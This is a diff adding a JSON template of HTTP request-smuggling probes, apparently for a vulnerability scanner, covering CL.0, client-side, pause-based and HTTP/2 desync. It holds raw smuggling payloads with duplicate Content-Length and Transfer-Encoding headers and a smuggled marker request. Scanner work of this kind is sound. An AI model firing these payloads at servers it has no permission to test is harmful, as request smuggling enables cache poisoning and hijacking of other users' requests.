@@ -1,0 +1,102 @@
+{
+  "category": "http_desync",
+  "contexts": {
+    "cl_zero": {
+      "description": "CL.0 desync -- server ignores Content-Length on certain endpoints, treating POST body as start of next request",
+      "tech_match": ["Apache", "Nginx", "AWS ALB", "HAProxy", "IIS", "Node.js"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 5\r\n\r\n0\r\n\r\nGET /swktest-desync-{{marker}} HTTP/1.1\r\nHost: {{host}}\r\n\r\n",
+          "description": "CL.0 desync probe -- send POST with body containing smuggled GET; if server ignores CL, smuggled request processes as separate request",
+          "matchers": [
+            {"type": "status", "status": [200, 404]},
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 0\r\nContent-Length: 50\r\n\r\nGET /swktest-clcl-{{marker}} HTTP/1.1\r\nX: x",
+          "description": "Duplicate Content-Length desync -- front-end uses first CL (0), back-end uses second CL (50), smuggling the trailing request",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "client_side_desync": {
+      "description": "Client-side desync -- abuse browser connection pooling to poison same-origin requests via desync in same TCP connection",
+      "tech_match": ["Apache", "Nginx", "Node.js", "Express"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 0\r\nTransfer-Encoding: chunked\r\n\r\n",
+          "description": "CL+TE probe for client-side desync -- test if server accepts both CL and TE headers (prerequisite for browser-powered desync)",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["bad request", "400"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "GET {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
+          "description": "GET with Transfer-Encoding -- some servers process chunked encoding on GET, enabling desync when browser reuses connection",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["bad request", "not allowed"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "pause_based": {
+      "description": "Pause-based desync -- send headers, pause, then send body; timeout differences between layers cause desync",
+      "tech_match": ["Apache", "Nginx", "HAProxy", "AWS ALB"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST {{baseline}} HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 100\r\n\r\n",
+          "description": "Pause-based desync detection -- send headers with large CL then delay body; if front-end times out and forwards partial request, back-end treats remaining data as new request",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [408, 502, 504], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "h2_desync": {
+      "description": "HTTP/2 desync -- exploit HTTP/2-to-HTTP/1 downgrade to inject smuggled requests",
+      "tech_match": ["Nginx", "AWS ALB", "CloudFront", "HAProxy"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "H2.CL desync -- HTTP/2 request with Content-Length header that disagrees with actual body length; H2 doesn't use CL but back-end HTTP/1 translation does",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"header": "Content-Length: 0"}
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "H2.TE desync -- inject Transfer-Encoding via HTTP/2 pseudo-headers or trailers; back-end HTTP/1 processes chunked encoding",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"header": "Transfer-Encoding: chunked"}
+        }
+      ]
+    }
+  }
+}
